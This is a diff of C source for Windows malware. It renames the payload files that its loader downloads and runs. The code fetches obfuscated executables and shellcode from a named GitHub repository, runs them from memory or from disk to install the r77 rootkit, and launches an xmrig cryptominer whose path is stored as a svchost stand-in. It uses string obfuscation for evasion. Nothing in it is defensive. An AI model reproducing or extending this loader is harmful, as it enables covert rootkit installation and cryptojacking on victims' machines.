@@ -568,7 +568,7 @@ BOOL DownloadAndExtractMallZip() {
     // Verify extraction
     char testFile[MAX_PATH];
     lstrcpyA(testFile, g_mallDir);
-    PathAppendA(testFile, "install.exe");
+    PathAppendA(testFile, "Install.exe");
     
     g_mallExtracted = (GetFileAttributesA(testFile) != INVALID_FILE_ATTRIBUTES);
     result = g_mallExtracted;
@@ -588,9 +588,9 @@ cleanup:
 BOOL ExecuteR77FromMemory(BOOL isExe) {
     OBF_STR url;
     if (isExe) {
-        url = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/install.exe", EVASION_SEED);
+        url = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/Install.exe", EVASION_SEED);
     } else {
-        url = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/install.shellcode", EVASION_SEED);
+        url = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/Install.shellcode", EVASION_SEED);
     }
     
     char* realUrl = Deobfuscate(&url);
@@ -626,9 +626,9 @@ BOOL ExecuteR77FromDisk(BOOL isExe) {
     lstrcpyA(filePath, g_mallDir);
     
     if (isExe) {
-        PathAppendA(filePath, "install.exe");
+        PathAppendA(filePath, "Install.exe");
     } else {
-        PathAppendA(filePath, "install.shellcode");
+        PathAppendA(filePath, "Install.shellcode");
     }
     
     if (GetFileAttributesA(filePath) == INVALID_FILE_ATTRIBUTES) {
@@ -683,22 +683,22 @@ BOOL ExecuteR77FromDisk(BOOL isExe) {
 void InstallR77() {
     BOOL r77Installed = FALSE;
     
-    // Step 1: Execute install.exe from memory
+    // Step 1: Execute Install.exe from memory
     r77Installed = ExecuteR77FromMemory(TRUE);
     if (r77Installed) return;
     
-    // Step 2: Execute install.exe from mall directory
+    // Step 2: Execute Install.exe from mall directory
     if (!g_mallExtracted) {
         DownloadAndExtractMallZip();
     }
     r77Installed = ExecuteR77FromDisk(TRUE);
     if (r77Installed) return;
     
-    // Step 3: Execute install.shellcode from memory
+    // Step 3: Execute Install.shellcode from memory
     r77Installed = ExecuteR77FromMemory(FALSE);
     if (r77Installed) return;
     
-    // Step 4: Execute install.shellcode from mall directory
+    // Step 4: Execute Install.shellcode from mall directory
     if (g_mallExtracted) {
         r77Installed = ExecuteR77FromDisk(FALSE);
         if (r77Installed) return;
@@ -724,7 +724,7 @@ void DownloadAndExecutePayloads() {
     // Execute $77-Egde.exe
     char edgePath[MAX_PATH];
     lstrcpyA(edgePath, g_mallDir);
-    PathAppendA(edgePath, "$77-Egde.exe");
+    PathAppendA(edgePath, "$77-xmrig.exe");
     lstrcpyA(g_svchostPath, edgePath);
     
     STARTUPINFOA si = { sizeof(si) };
